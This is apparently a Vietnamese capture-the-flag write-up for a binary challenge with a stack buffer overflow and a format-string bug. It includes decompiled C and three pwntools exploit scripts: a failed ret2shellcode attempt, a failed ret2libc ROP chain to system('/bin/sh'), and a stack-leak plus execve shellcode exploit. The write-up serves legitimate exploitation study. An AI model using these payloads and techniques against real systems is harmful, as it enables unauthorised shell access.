# Ret2libc hay Ret2shellcode ???

*1 chall khá thú vị đấy*

**ida:**

```c 

int __fastcall to_lower(const char *a1, int a2)
{
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i < a2; ++i )
    a1[i] = tolower(a1[i]);
  printf("RESULT: ");
  return printf(a1);
}

__int64 input()
{
  char s[64]; // [rsp+0h] [rbp-40h] BYREF

  fgets(s, 96, stdin);
  return to_lower(s, 24LL);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  puts("Input Text:");
  input();
  return 0;
}


```

**chà có 1 lúc cả BOF và fmtstr luôn**

checks:

![image](https://github.com/gookoosss/CTF/assets/128712571/69754002-7bfa-49aa-aec1-3656ca8082cf)


lần đầu gặp NX đóng đấy, n**ếu NX đóng thì ta nghĩ ngay đến ret2shellcode liền**

thử chạy cách này xem sao:

## ret2shellcode

```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./cs101-hw1_patched")
libc = ELF("./libc6_2.35-0ubuntu3.1_amd64.so")
p = process([exe.path])

context.binary = exe

shellcode = asm(
    '''
    mov rbx, 29400045130965551
    push rbx

    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
    ''', arch = 'amd64'
)

call_rax = 0x0000000000401014

gdb.attach(p,gdbscript= '''
b*input+51
b*to_lower+89
c
'''
)
input()

payload = shellcode
payload = payload.ljust(72, b'P')
payload += p64(exe.sym['input'] + 1)

p.sendlineafter(b'Input Text:\n' , payload)

payload = b'a'*72
payload += p64(call_rax)

p.sendline(payload)


p.interactive()

```

chà không được rồi

trong quá trình chạy hàm **to_lower**, chương trình lặp liên tục làm rax thay đổi thành 0x18 làm mất đi shellcode ta gán ban đầu, **lý do là hàm to_lower sẽ viết hoa hoặc ngược lại 24byte đầu ta nhập vào**

hmm bây giờ **ret2shellcode** ko được ta **ret2libc** thôi

**thử làm cách ret2libc bằng script này xem sao:**

## Ret2libc

```python3
from pwn import *

p = process('./cs101-hw1_patched')
exe = ELF("./cs101-hw1_patched")
libc = ELF('./libc6_2.35-0ubuntu3.1_amd64.so')

gdb.attach(p,gdbscript= '''
b*input+51
b*to_lower+89
c
'''
)
input()

    
payload = b'%25$p|'
payload = payload.ljust(72, b'P')
payload += p64(exe.sym['input'] + 1)
# payload += b'a'*264
# payload += p64(exe.sym['flag'])

# p.sendlineafter(b'cave?\n', payload)
p.sendlineafter(b'Input Text:\n' , payload)
p.recvuntil(b'RESULT: ')
# libc_leak = int(p.recvline()[:-1], 16)
libc_leak = int(p.recvuntil(b'|',drop=True),16)
libc.address = libc_leak - 0x29d90
log,info("libc leak: " + hex(libc_leak))
log,info("libc base: " + hex(libc.address))


pop_rdi = 0x000000000002a3e5 + libc.address
ret_addr = 0x0000000000029cd6 + libc.address

payload = b'a'*72
# payload += p64(ret_addr)
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(ret_addr)
payload += p64(libc.sym['system'])

# p.sendlineafter(b'Input Text:\n' , payload)
p.sendline(payload)


p.interactive()
```

vẫn ko được huhu

kiểm tra lại ida thì mới thấy là ta chỉ nhập được tối đa là 96byte, còn **ret2libc của ta bị quá 8byte rồi huhu**

sau khi được hint thì mình quyết định làm **ret2shellcode cần leak**

## (Ret2shellcode cần leak)

### ý tưởng 

- lợi dụng lỗi fmt thì ta có **dễ dàng leak được địa chỉ stack**
- hàm to_lower sẽ tự động thay đổi 24byte đầu của ta, nên đặt shellcode lên đầu là quá non, **ta cần bỏ qua 24byte đầu rồi mới đặt shellcode ở đó**
- ta chỉ nhập được 1 lần duy nhất nên lần leak stack ta sẽ **ret2win vào hàm input để nhập lại 1 lần nữa rồi gán shellcode vào**
- vì ta đã leak được địa chỉ stack nên **ta có thể dễ dàng tính offset ra địa chỉ stack trỏ đến shellcode**

### script

```python3 
from pwn import *

p = process('./cs101-hw1_patched')
exe = ELF("./cs101-hw1_patched")
libc = ELF('./libc6_2.35-0ubuntu3.1_amd64.so')

gdb.attach(p,gdbscript= '''
b*input+27
b*input+51
b*to_lower+89
c
'''
)
input()

shellcode = asm(
    '''
    mov rbx, 29400045130965551
    push rbx

    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
    ''', arch = 'amd64'
)

# stage 1: leak stack 

payload = b'%29$p|'
payload = payload.ljust(72, b'P')
payload += p64(exe.sym['input'] + 1)
p.sendlineafter(b'Input Text:\n' , payload)
p.recvuntil(b'RESULT: ')
stack_leak = int(p.recvuntil(b'|',drop=True),16)
stack_shellcode = stack_leak - 0x150
log.info("stack leak: " + hex(stack_leak))
log.info("shellcode addr: " + hex(stack_shellcode))

# stage 2: add shellcode

payload = b'a'*24
payload += shellcode
payload = payload.ljust(72, b'P')
payload += p64(stack_shellcode)

p.sendline(payload)
p.interactive()

```



